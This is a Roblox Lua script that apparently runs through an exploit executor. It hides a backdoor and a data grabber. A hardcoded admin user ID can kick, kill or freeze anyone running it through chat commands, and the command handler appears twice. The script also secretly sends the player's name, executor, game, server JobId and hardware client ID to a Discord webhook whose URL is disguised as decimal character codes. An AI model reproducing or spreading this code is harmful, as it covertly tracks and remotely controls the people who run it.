--!nolint
--!nocheck

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Admins = {
    [233377111] = true,
}

local Commands = {
    ["kick"] = function()
        LocalPlayer:Kick("You have been kicked by an admin.")
    end,
    ["kill"] = function()
        LocalPlayer.Character.Humanoid.Health = 0
    end,
    ["freeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = true
        end
    end,
    ["unfreeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = false
        end
    end,
}

local function FindUser(Name)
    if #Name < 3 then
        return nil
    end

    Name = string.lower(Name)
    for _, player in pairs(Players:GetPlayers()) do
        if string.sub(string.lower(player.Name), 1, #Name) == Name then
            return player
        end
    end
    return nil
end

for _, Player in pairs(Players:GetPlayers()) do
    if Admins[Player.UserId] then
        Player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()
            local targetName = args[2]

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
            end

            local target = FindUser(targetName)
            if target == LocalPlayer and Commands[command] then
                Commands[command]()
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if Admins[player.UserId] then
        player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()
            local targetName = args[2]

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
            end

            local target = FindUser(targetName)
            if target == LocalPlayer and Commands[command] then
                Commands[command]()
            end
        end)
    end
end)

Players.PlayerAdded:Connect(function(player)
    if Admins[player.UserId] then
        player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
                local targetName = args[2]
                local target = FindUser(targetName)
                
                if target and Commands[command] then
                    Commands[command](target)
                end
            else
                local targetName = args[2]
                local target = LocalPlayer
                if targetName then
                    target = FindUser(targetName) or LocalPlayer
                end
                
                if Commands[command] then
                    Commands[command](target)
                end
            end
        end)
    end
end)

local Executor = identifyexecutor()
local ExecutorText = tostring(identifyexecutor())

local embed = {
	["title"] = LocalPlayer.Name,
	["color"] = 0x2f5bc7,
	["fields"] = {
		{
			["name"] = "Executor",
			["value"] = ExecutorText,
			["inline"] = true
		},
		{
			["name"] = "Game",
			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			["inline"] = true
		},
		{
			["name"] = "JobId",
			["value"] = game.JobId,
			["inline"] = true
		},
		{
			["name"] = "RbxAnalytics HWID",
			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
			["inline"] = true
		}
	}
}

local payload = {
	["embeds"] = {embed},
}

local function decryptString(encrypted)
    local decrypted = {}
    for ascii in encrypted:gmatch("%d+") do
        table.insert(decrypted, string.char(tonumber(ascii)))
    end
    return table.concat(decrypted)
end

local obfuscatedWebhookURL = "104/116/116/112/115/58/47/47/100/105/115/99/111/114/100/46/99/111/109/47/97/112/105/47/119/101/98/104/111/111/107/115/47/49/51/51/48/48/55/50/49/49/57/54/52/55/56/48/49/52/50/54/47/83/107/45/110/81/57/122/102/108/65/104/66/78/106/55/48/57/76/87/121/89/107/102/81/106/115/101/107/99/83/71/121/78/48/71/48/108/74/78/65/68/67/119/70/122/72/98/108/100/53/83/56/117/117/56/66/69/45/56/85/53/104/89/119/71/115/98/68"
local webhookURL = decryptString(obfuscatedWebhookURL)

local httpRequest = {
	Url = webhookURL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

request(httpRequest)
